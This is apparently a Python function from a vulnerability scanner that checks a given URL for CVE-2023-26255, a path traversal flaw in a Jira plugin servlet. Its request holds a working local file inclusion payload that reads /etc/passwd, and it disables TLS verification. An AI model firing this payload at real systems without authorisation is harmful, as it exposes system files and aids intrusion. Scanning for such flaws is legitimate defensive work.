import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import json
from urllib.parse import urlparse
import urllib3


def check_cve_2023_26255(url):
    '''
    Checks for CVE-2023-26255
    '''
    check_cve_2023_26255_url = f"{url.rstrip('/')}/plugins/servlet/snjCustomDesignConfig?fileName=../../../../../../etc/passwd&fileMime=$textMime"
    vulnerabilities = ''
    headers = {
        'X-Atlassian-Token': 'no-check'
    }

    try:
        print(f"{Fore.YELLOW}\nINFO: IN DEVELOPMENT Checking for CVE-2023-26255")
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_cve_2023_26255_url}")
        response = requests.get(check_cve_2023_26255_url, headers=headers, allow_redirects=False, verify=False)
        #print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")

        # Check for the vulnerability
        if response.status_code == 200:
            response_text = response.text
            # print(response_text) DEBUG

            if ("root:" in response_text):
                vulnerabilities += (f"+ [LFI] - CVE-2023-26255 Detected [Manually Review] | URL: {check_cve_2023_26255_url}")
                print(f"\n{Fore.GREEN}+ [LFI] - CVE-2023-26255 Detected [Manually Review]{Style.RESET_ALL}")
                print(f"  URL: {check_cve_2023_26255_url}")
            else:
                print(f"{Fore.YELLOW}\n- No CVE-2023-26255 vulnerability detected on: {check_cve_2023_26255_url}") 
                # print(f"  URL: {check_cve_2023_26255_url}")

        elif response.status_code == 403:
            print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")

        else:
            print(f"{Fore.YELLOW}- No CVE-2023-26255 vulnerability detected on: {check_cve_2023_26255_url}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}{Style.RESET_ALL}")

    except Exception as e:
            print(f"{Fore.RED}* CVE-2023-26255 - An error occurred while checking {check_cve_2023_26255_url}: {e}{Style.RESET_ALL}")
    return vulnerabilities
